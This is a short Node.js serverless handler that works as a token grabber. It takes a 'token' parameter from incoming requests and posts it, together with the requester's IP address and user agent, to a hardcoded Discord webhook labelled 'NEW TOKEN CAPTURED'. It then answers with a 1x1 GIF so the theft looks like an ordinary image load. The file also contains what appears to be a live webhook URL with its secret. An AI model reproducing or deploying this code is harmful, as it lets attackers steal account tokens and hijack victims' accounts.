const axios = require('axios');

module.exports = async (req, res) => {
  try {
    // Replace with your actual Discord webhook URL
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1471811275422957580/DXYSo17alHTrrSPsq7sfLRNNGMdl4C1MxhTl5Azhyn4WSFa1xLgdTWx2uPJmRKKhWZkT";

    const token = req.query.token || req.body.token;
    if (!token) return res.status(200).send('OK');

    // Get additional information
    const ip = req.headers['x-forwarded-for'] || req.connection?.remoteAddress;
    const userAgent = req.headers['user-agent'];

    // Send to Discord webhook
    await axios.post(WEBHOOK_URL, {
      content: `🔑 **NEW TOKEN CAPTURED** 🔑\n\`\`\`${token}\`\`\`\n🌐 IP: ${ip}\n💻 User Agent: ${userAgent}`,
      username: "Token Grabber",
      avatar_url: "https://cdn-icons-png.flaticon.com/512/104/104710.png"
    });

    // Return a valid image response
    const pixel = Buffer.from([
      0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00,
      0x80, 0x00, 0x00, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x21,
      0xf9, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x00,
      0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44,
      0x01, 0x00, 0x3b
    ]);

    res.setHeader('Content-Type', 'image/gif');
    res.status(200).send(pixel);
  } catch (error) {
    console.error('Error:', error);
    res.status(200).send('OK');
  }
};
